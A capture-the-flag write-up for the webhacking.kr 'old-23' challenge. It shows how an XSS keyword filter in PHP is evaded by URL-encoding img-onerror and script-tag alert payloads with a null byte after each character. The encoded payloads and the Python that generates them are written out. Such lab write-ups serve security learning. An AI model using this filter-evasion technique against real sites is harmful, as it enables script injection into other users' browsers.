# Old 23    XSS Filter Bypass With Null Bytes

URL: [https://webhacking.kr/challenge/bonus-3/](https://webhacking.kr/challenge/bonus-3/)

![old-23.png](/assets/ctf/webhacking.kr/old-23.png)

If we try payload like `<i>uwu` we get `no hack`.

```html
<i>x -> no hack
<i>x</i> -> HTML
<h1>x</h1> -> HTML
<img/> -> no hack 
<svg/> -> no hack 
<a>x</a> -> HTML
<a href=y>x</a> -> no hack
```

There seems to be some kind of filter whenever we have certain word in a string we are trying to inject. Usual payloads were not working due to this filter. Since we are dealing with PHP we could probably inject null bytes before characters to prevent the filter processing string normally.

URL Encode payload while adding null byte after each character:
```python
>>> s='<img src=x onerror=alert(1)>'
>>> ''.join(f'%{ord(c):0X}%00' for c in s)
'%3C%00%69%00%6D%00%67%00%20%00%73%00%72%00%63%00%3D%00%78%00%20%00%6F%00%6E%00%65%00%72%00%72%00%6F%00%72%00%3D%00%61%00%6C%00%65%00%72%00%74%00%28%00%31%00%29%00%3E%00'
```

We get `alert`, but not solve.

![old-23-1.png](/assets/ctf/webhacking.kr/old-23-1.png)

Following the description we should inject `script` tags, not just any XSS for `alert`
```python
>>> s='<script>alert(1);</script>'
>>> ''.join(f'%{ord(c):0X}%00' for c in s)
'%3C%00%73%00%63%00%72%00%69%00%70%00%74%00%3E%00%61%00%6C%00%65%00%72%00%74%00%28%00%31%00%29%00%3B%00%3C%00%2F%00%73%00%63%00%72%00%69%00%70%00%74%00%3E%00'
```

![old-23-2.png](/assets/ctf/webhacking.kr/old-23-2.png)

